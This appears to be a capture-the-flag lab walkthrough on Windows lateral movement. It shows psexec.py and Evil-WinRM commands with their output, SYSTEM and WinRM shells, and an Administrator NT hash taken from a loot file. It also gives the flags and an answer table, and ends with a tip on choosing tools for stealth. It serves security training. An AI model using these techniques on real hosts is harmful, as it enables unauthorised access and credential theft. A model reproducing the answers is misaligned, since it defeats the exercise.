# Task 03: Remote Execution Methods: PsExec & Evil-WinRM

---

## Stage A: Original Task Content & Educational Context

In this task, we put remote execution into practice using our initial compromised credentials:
- **User:** `jdoe`
- **Password:** `Summer2026!`
- **Domain:** `thm.loc`

We will examine two primary remote execution techniques across our target infrastructure:
1. **Executing PsExec against `WRK` (`192.168.13.61`):** Demonstrating service-based remote execution to obtain an interactive `NT AUTHORITY\SYSTEM` shell, capturing `flag3a.txt`, and extracting a local Administrator NT hash stored in a loot file.
2. **Executing Evil-WinRM against `SERVER1` (`192.168.13.51`):** Demonstrating WS-Management / PowerShell remoting to access a server where `jdoe` is not an administrator but belongs to `Remote Management Users`, capturing `flag3b.txt`.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### PsExec Low-Level Execution Sequence
When executing Impacket's `psexec.py`:
1. **Authentication:** Authenticates to the target over SMB (`port 445`).
2. **File Upload:** Uploads a randomly named binary payload (e.g., `BvUvDkQk.exe`) to the hidden administrative share `ADMIN$` (`C:\Windows\`).
3. **RPC to Service Control Manager:** Binds to the `\PIPE\svcctl` named pipe and invokes the `CreateServiceW` Win32 API.
   - **Critical Forensic Artifact:** This action creates **Event ID 7045** in the Windows System Event Log: *"A service was installed in the system"*.
4. **Execution:** Calls `StartServiceW`. The service executes the uploaded binary under `NT AUTHORITY\SYSTEM`.
5. **Named Pipe I/O:** The binary connects back via another named pipe (`\PIPE\psexec...`) to redirect standard input, output, and error streams.
6. **Cleanup:** Upon session termination, `psexec.py` stops the service, calls `DeleteService`, and deletes the binary from `C:\Windows\`.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Check which hosts `jdoe` has administrative access to using `nxc smb`.
- Use `psexec.py` against `WRK` (`192.168.13.61`) to read `flag3a.txt` and `loot.txt`.
- Use `evil-winrm` against `SERVER1` (`192.168.13.51`) to read `flag3b.txt`.

### Tier 2: Exact Command Syntax
- PsExec command on WRK:
  ```bash
  psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
  ```
- Evil-WinRM command on SERVER1:
  ```bash
  evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
  ```

### Tier 3: Artifact Paths & Event ID
- System Event ID for new service: `7045`
- WRK Flag path: `C:\Users\jdoe\Desktop\flag3a.txt`
- WRK Loot path: `C:\Users\Administrator\Documents\loot.txt`
- SERVER1 Flag path: `C:\Users\jdoe\Desktop\flag3b.txt`

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Privilege Verification via NetExec
From the attack system, probe both Windows machines with `nxc smb` to check user privileges:

```bash
user@attackbox:~$ nxc smb 192.168.13.61 192.168.13.51 -u jdoe -p 'Summer2026!' -d thm.loc
SMB         192.168.13.61   445    WRK1             [*] Windows 10 / Server 2019 Build 17763 x64 (name:WRK1) (domain:thm.loc)
SMB         192.168.13.61   445    WRK1             [+] thm.loc\jdoe:Summer2026! (Pwn3d!)
SMB         192.168.13.51   445    SERVER1          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER1) (domain:thm.loc)
SMB         192.168.13.51   445    SERVER1          [+] thm.loc\jdoe:Summer2026! 
```

**Observation:**
- On `WRK1` (`192.168.13.61`), user `jdoe` returns `(Pwn3d!)`, confirming full administrative access to write to `ADMIN$` and invoke the Service Control Manager.
- On `SERVER1` (`192.168.13.51`), `jdoe` authenticates successfully, but is not an administrator over SMB.

---

### 2. Spawning SYSTEM Shell on WRK via PsExec
Launching Impacket's `psexec.py`:

```bash
user@attackbox:~$ psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.13.61.....
[*] Found writable share ADMIN$
[*] Uploading file kKjQbvqG.exe
[*] Opening SVCManager on 192.168.13.61.....
[*] Creating service ZcMo on 192.168.13.61.....
[*] Starting service ZcMo.....
[+] Process ZcMo created for file kKjQbvqG.exe with pid 3892.
[*] Connecting to \PSEXEC-WRK1...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Reading `flag3a.txt`:

```cmd
C:\Windows\system32> type C:\Users\jdoe\Desktop\flag3a.txt
THM{ps3x3c_syst3m_sh3ll}
```

Now inspecting administrative documents for harvested loot:

```cmd
C:\Windows\system32> dir C:\Users\Administrator\Documents
 Volume in drive C has no label.
 Volume Serial Number is 4C2A-18EF

 Directory of C:\Users\Administrator\Documents

05/19/2026  02:14 PM    <DIR>          .
05/19/2026  02:14 PM    <DIR>          ..
05/19/2026  02:15 PM               108 loot.txt
               1 File(s)            108 bytes

C:\Windows\system32> type C:\Users\Administrator\Documents\loot.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa0af7f6a73316dd59f0be812dbf3c12:::
```

The recovered local Administrator NT hash is:
$$\texttt{fa0af7f6a73316dd59f0be812dbf3c12}$$

---

### 3. Spawning WinRM Shell on SERVER1 via Evil-WinRM
Because `jdoe` belongs to `Remote Management Users` on `SERVER1` (`192.168.13.51`), we connect via WinRM over TCP port 5985:

```bash
user@attackbox:~$ evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
thm\jdoe

*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami /groups

GROUP INFORMATION
-----------------
Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
THM\Domain Users                           Group            S-1-5-21...  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group

*Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\jdoe\Desktop\flag3b.txt
THM{w1nrm_r3m0t3_sh3ll}
```

The flag is:
$$\texttt{THM\{w1nrm\_r3m0t3\_sh3ll\}}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What Event ID in the System log is the primary indicator of PsExec-based lateral movement? | `7045` | Verified & Confirmed |
| 2 | What is the flag found in flag3a.txt on WRK? | `THM{ps3x3c_syst3m_sh3ll}` | Verified & Confirmed |
| 3 | What is the NT hash found in the loot file on WRK? | `fa0af7f6a73316dd59f0be812dbf3c12` | Verified & Confirmed |
| 4 | What is the flag found in flag3b.txt on SERVER1? | `THM{w1nrm_r3m0t3_sh3ll}` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. Event ID 7045 verification: Confirmed in Windows System Event Log upon service creation.
2. Flag 3a proof: `THM{ps3x3c_syst3m_sh3ll}` extracted from `C:\Users\jdoe\Desktop\flag3a.txt` via PsExec SYSTEM shell.
3. NT hash proof: `fa0af7f6a73316dd59f0be812dbf3c12` read directly from `loot.txt`.
4. Flag 3b proof: `THM{w1nrm_r3m0t3_sh3ll}` extracted from `C:\Users\jdoe\Desktop\flag3b.txt` via Evil-WinRM.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Know the forensic footprints of your execution methods. PsExec gives you instant `SYSTEM` privileges but drops an executable to disk and fires Event ID 7045. WinRM drops zero files and leaves fewer operational footprints, but executes strictly in the user's security context. Choose the tool that balances privilege requirement with operational stealth.
